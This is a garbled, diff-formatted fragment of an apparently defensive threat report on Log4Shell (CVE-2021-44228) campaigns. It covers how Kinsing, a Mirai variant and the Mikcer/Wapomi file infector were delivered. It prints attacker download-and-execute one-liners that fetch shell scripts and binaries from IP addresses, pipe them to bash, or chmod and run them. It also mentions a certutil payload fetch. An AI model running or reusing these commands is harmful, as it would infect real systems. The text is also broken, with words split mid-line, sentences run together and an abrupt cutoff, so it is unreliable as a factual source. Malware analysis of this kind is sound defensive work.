@@ -1,0 +1,17 @@
+
+( curl -s 92[.]242.40.21/lh.
+sh || wget -q -O- 92[.]242.40.21/lh.sh)| bash The script will in turn download the Kinsing binary (6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b) from the same IP.
+Inside lh.sh shell script Other attacks installing Kinsing 
+Malware are as follows: (curl -s 82[.]118.18.201/lh.sh|| wget -q -O- 82[.]118.18.201/lh.sh)|bash - base64 decoded 68cc0ae1ca1e26d5f1dba19d065291ae6c5c69c9f37b9f384245d6fa070f1d69  - Kinsing Binary Mirai First sighting exploiting CVE-2021-44228: December 15, 2021
+The attack also used the JNDIExploit tool.
+The base64 encoded string is as follows: wget http://152[.]67.63.150/py; curl -O http://152[.]67.63.150/py; chmod 777 py; ./py
+rce.x86 This gets executed on the target which will download ‘py’ binary, a variant of the Mirai bot.
+Virus.
+Mikcer First sighting exploiting CVE-2021-44228: 2021-12-15
+The following attack specifically targets Apache Solr based on the GET request.
+The attacker-controlled LDAP server sends ExecTemplateJDK8.class, which gets executed on the target.
+This class will download log4tst.exe using certutil from 182.131.31.122:5367.
+The binary is a v ariant of Virus.
+Mikcer ( a.k . a .
+Wapomi ) which is a type of file infector.
+This type of malware finds Windows executable program (e.g.,  .exe
